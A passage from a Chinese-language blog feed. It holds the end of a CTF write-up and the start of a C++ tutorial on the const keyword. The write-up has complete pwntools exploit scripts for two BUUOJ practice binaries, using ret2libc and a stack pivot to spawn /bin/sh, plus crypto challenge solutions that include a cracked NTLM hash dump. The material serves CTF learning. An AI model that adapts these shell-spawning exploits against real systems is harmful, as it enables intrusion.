class="string">&quot;node4.buuoj.cn:25522&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">__libc_start_main = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vulnerable_function = elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Debug(p, &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># b *0x08048483</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line">ru(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x88</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(__libc_start_main) + p32(<span class="number">4</span>) + p32(vulnerable_function)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">__libc_start_main_addr = u32(rv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">lib = ELF(<span class="string">&quot;./libc-2.23_32.so&quot;</span>)</span><br><span class="line">lib.address = __libc_start_main_addr - lib.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;lib.address =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(lib.address)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;lib.address =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(lib.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = <span class="built_in">next</span>(lib.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&quot;A&quot;</span> * <span class="number">0x88</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(str_bin_sh)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">   RELRO:    Partial RELRO</span><br><span class="line">   Stack:    No canary found</span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><strong>vul():</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u); <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">48u</span>); <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出，但溢出大小有限，只能溢出4个字节，但刚好可以覆盖到<code>esp</code>和<code>return address</code></p><p><strong>hack():</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在system函数，<code>echo flag</code>是真的只输出<code>flag</code>这四个字符</p><p>综上考虑，考虑迁栈，即返回到<code>system</code>时，栈上数据为传入参数<code>/bin/sh</code></p><p>那么我们首先要把栈地址弄出来，题目正好有两个输入两个输出</p><h4 id="EXP-22"><a href="#EXP-22" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:28710&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * (<span class="number">40</span> - <span class="number">4</span>) + <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line">ru(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">ru(<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">esp = u32(rv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;esp: %x&quot;</span> % esp)</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret_addr = <span class="number">0x080485FD</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(system_plt)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(esp - <span class="number">0x38</span>+<span class="number">0x10</span>) + <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(esp - <span class="number">0x38</span>)</span><br><span class="line">payload += p32(leave_ret_addr)</span><br><span class="line">sd(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a> 直接查得<code>admin1</code></p><p>则flag为<code>flag&#123;admin1&#125;</code></p><h3 id="Url编码"><a href="#Url编码" class="headerlink" title="Url编码"></a>Url编码</h3><p><a href="https://tool.oschina.net/encode?type=4">https://tool.oschina.net/encode?type=4</a> 解得 <code>flag&#123;and 1=1&#125;</code></p><h3 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h3><p>base64 解得 <code>flag&#123;THE_FLAG_OF_THIS_STRING&#125;</code></p><h3 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h3><p>简单的移位密码, ROT13, 解得flag <code>flag&#123;5cd1004d-86a5-46d8-b720-beb5ba0417e1&#125;</code></p><h3 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h3><p>观察知前四位分别与<code>flag</code>相差5,6,7,8</p><p>则有</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">b&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">s = <span class="built_in">bytearray</span>(s)</span><br><span class="line">j = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">  s[i] += j</span><br><span class="line">  j += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>得flag<code>flag&#123;Caesar_variation&#125;</code></p><h3 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h3><p><a href="http://web.chacuo.net/charsetquotedprintable">http://web.chacuo.net/charsetquotedprintable</a> 得<code>flag&#123;那你也很棒哦&#125;</code></p><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>UTF-8 编码, 脑洞猜flag: <code>flag&#123;zs19900315&#125;</code></p><h3 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">n = p * q</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p>得flag <code>flag&#123;5577446633554466577768879988&#125;</code></p><h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h3><p>用Rabbit解密得flag<code>flag&#123;Cute_Rabbit&#125;</code></p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><p>得flag: <code>flag&#123;125631357777427553&#125;</code></p><h3 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</span><br></pre></td></tr></table></figure><p>linux的passwd文件，用<a href="https://www.cmd5.com/">https://www.cmd5.com/</a>解密得<code>good-luck</code>, 则flag: <code>flag&#123;good-luck&#125;</code></p><h3 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h3><p><a href="http://factordb.com/index.php?query=98554799767">http://factordb.com/index.php?query=98554799767</a> 查得两个素数为<code>101999</code>和<code>966233</code>, 则</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s = <span class="string">&quot;101999&quot;</span> + <span class="string">&quot;966233&quot;</span></span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(s).hexdigest())</span><br></pre></td></tr></table></figure><p>得flag: <code>flag&#123;d450209323a847c8d01c6be47c81811a&#125;</code></p><h3 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h3><p>栅栏密码, 加密向量为2, 得到flag<code>flag&#123;wethinkwehavetheflag&#125;</code></p><h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</span><br></pre></td></tr></table></figure><p>秀上天际， 生僻字谐音, flag为<code>BJD&#123;淛匶襫黼瀬鎶軄鶛驕鳓哵&#125;</code></p><h3 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h3><p>凯撒密码, <code>FRPHEVGL</code>通过加密向量<code>13</code>解出<code>SECURITY</code></p><p>则flag为<code>flag&#123;PbzrPuvan&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Const</title>
      <link href="/note-binary-const/"/>
      <url>/note-binary-const/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>const 是 constant 的缩写, 本意是<code>不变的, 不易改变</code>的意思。在 C++ 中是用来修饰内置类型变量, 自定义对象, 成员函数, 返回值, 函数参数。</p><p>C++ const 允许指定一个语义约束, 编译器会强制实施这个约束, 允许程序员告诉编译器某值是保持不变的。如果在编程中确实有某个值保持不变, 就应该明确使用const, 这样可以获得编译器的帮助。</p><h2 id="修饰普通类型的变量"><a href="#修饰普通类型的变量" class="headerlink" title="修饰普通类型的变量"></a>修饰普通类型的变量</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>  a = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span>  b = a; <span class="comment">// 正确</span></span><br><span class="line">a = <span class="number">8</span>;       <span class="comment">// 错误, 不能改变</span></span><br></pre></td></tr></table></figure><p>a 被定义为一个常量, 并且可以将 a 赋值给 b, 但是不能给 a 再次赋值。对一个常量赋值是违法的事情, 因为 a 被编译器认为是一个<code>常量</code>, 其值不允许修改。</p><h2 id="修饰指针变量"><a href="#修饰指针变量" class="headerlink" title="修饰指针变量"></a><strong>修饰指针变量</strong></h2><p>const 修饰指针变量有以下三种情况。</p><ul><li>A: const 修饰指针指向的内容, 则内容为不可变量。</li><li>B: const 修饰指针, 则指针为不可变量。</li><li>C: const 修饰指针和指针指向的内容, 则指针和指针指向的内容都为不可变量。</li></ul><p>对于 A:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cosnt <span class="keyword">int</span> *p = <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p>则指针指向的内容 8 不可改变。简称左定值, 因为 const 位于 * 号的左边。</p><p>对于 B:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span>* <span class="keyword">const</span> p = &amp;a;</span><br><span class="line">*p = <span class="number">9</span>; <span class="comment">// 正确</span></span><br><span class="line"><span class="keyword">int</span>  b = <span class="number">7</span>;</span><br><span class="line">p = &amp;b; <span class="comment">// 错误</span></span><br></pre></td></tr></table></figure><p>对于 const 指针 p 其指向的内存地址不能够被改变, 但其内容可以改变。简称, 右定向。因为 const 位于 * 号的右边。</p><p>对于C:<strong>则是 A 和 B的合并</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> * <span class="keyword">const</span>  p = &amp;a;</span><br></pre></td></tr></table></figure><p>这时, <code>const p</code>的指向的内容和指向的内存地址都已固定, 不可改变。</p><p>对于 A, B, C 三种情况, 根据<code>const</code> 位于 * 号的位置不同, 我总结三句话便于记忆的话:**”左定值, 右定向, const修饰不变量”**。</p><h2 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h2><p>对于<code>const</code>修饰函数参数可以分为三种情况。</p><ul><li>值传递的 <code>const</code>修饰传递, 一般这种情况不需要<code>const</code>修饰, 因为函数会自动产生临时变量复制实参值。</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cpf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;a;</span><br><span class="line">    <span class="comment">// ++a;  是错误的, a 不能被改变</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">Cpf</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当<code>const</code> 参数为指针时, 可以防止指针被意外篡改。</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cpf</span><span class="params">(<span class="keyword">int</span> *<span class="keyword">const</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;*a&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    *a = <span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">Cpf</span>(&amp;a);</span><br><span class="line">    cout&lt;&lt;a; <span class="comment">// a 为 9</span></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>自定义类型的参数传递, 需要临时对象复制参数, 对于临时对象的构造, 需要调用构造函数, 比较浪费时间, 因此我们采取 const 外加引用传递的方法。</li></ul><p>并且对于一般的 int、double 等内置类型, 我们不采用引用的传递方式。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">public</span>:</span></span><br><span class="line">    <span class="built_in">Test</span>()&#123;&#125;</span><br><span class="line">    <span class="built_in">Test</span>(<span class="keyword">int</span> _m):_cm(_m)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get_cm</span><span class="params">()</span><span class="keyword">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> _cm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> _cm;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cmf</span><span class="params">(<span class="keyword">const</span> Test&amp; _tt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;_tt.<span class="built_in">get_cm</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Test <span class="title">t</span><span class="params">(<span class="number">8</span>)</span></span>;</span><br><span class="line">    <span class="built_in">Cmf</span>(t);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果输出 <strong>8</strong>。</p><h2 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h2><p>Const 修饰返回值分三种情况。</p><ul><li>const 修饰内置类型的返回值, 修饰与不修饰返回值作用一样。</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">int</span> <span class="title">Cmf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Cpf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> _m = <span class="built_in">Cmf</span>();</span><br><span class="line">    <span class="keyword">int</span> _n = <span class="built_in">Cpf</span>();</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;_m&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;_n;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>const 修饰自定义类型的作为返回值, 此时返回的值不能作为左值使用, 既不能被赋值, 也不能被修改。</p></li><li><p>const 修饰返回的指针或者引用, 是否返回一个指向 const 的指针, 取决于我们想让用户干什么。</p></li></ul><h2 id="修饰类成员函数"><a href="#修饰类成员函数" class="headerlink" title="修饰类成员函数"></a>修饰类成员函数</h2><p>const 修饰类成员函数, 其目的是防止成员函数修改被调用对象的值, 如果我们不想修改一个调用对象的值, 所有的成员函数都应当声明为 const 成员函数。</p><p>**注意:**const 关键字不能与 static 关键字同时使用, 因为 static 关键字修饰静态成员函数, 静态成员函数不含有 this 指针, 即不能实例化, const 成员函数必须具体到某一实例。</p><p>下面的 <code>get_cm() const</code>函数用到了 <code>const</code> 成员函数:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Test</span>()&#123;&#125;</span><br><span class="line">    <span class="built_in">Test</span>(<span class="keyword">int</span> _m):_cm(_m)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get_cm</span><span class="params">()</span><span class="keyword">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> _cm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> _cm;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cmf</span><span class="params">(<span class="keyword">const</span> Test&amp; _tt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;_tt.<span class="built_in">get_cm</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Test <span class="title">t</span><span class="params">(<span class="number">8</span>)</span></span>;</span><br><span class="line">    <span class="built_in">Cmf</span>(t);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>get_cm()</code>去掉<code>const</code>修饰, 则<code>Cmf</code>传递的 <code>const _tt</code>即使没有改变对象的值, 编译器也认为函数会改变对象的值, 所以我们尽量按照要求将所有的不需要改变对象内容的函数都作为 <code>const</code>成员函数。</p><p>如果有个成员函数想修改对象中的某一个成员怎么办？这时我们可以使用 <code>mutable</code>关键字修饰这个成员, <code>mutable</code>的意思也是易变的, 容易改变的意思, 被 mutable 关键字修饰的成员可以处于不断变化中, 如下面的例子。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Test</span>(<span class="keyword">int</span> _m, <span class="keyword">int</span> <span class="keyword">_t</span>):_cm(_m), _ct(<span class="keyword">_t</span>)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Kf</span><span class="params">()</span><span class="keyword">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ++_cm; <span class="comment">// 错误</span></span><br><span class="line">        ++_ct; <span class="comment">// 正确</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> _cm;</span><br><span class="line">    <span class="keyword">mutable</span> <span class="keyword">int</span> _ct;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Test <span class="title">t</span><span class="params">(<span class="number">8</span>, <span class="number">7</span>)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们在<code>Kf() const</code>中通过 <code>++_ct</code>; 修改 <code>_ct</code>的值, 但是通过<code>++_cm</code>修改<code>_cm</code>则会报错。因为 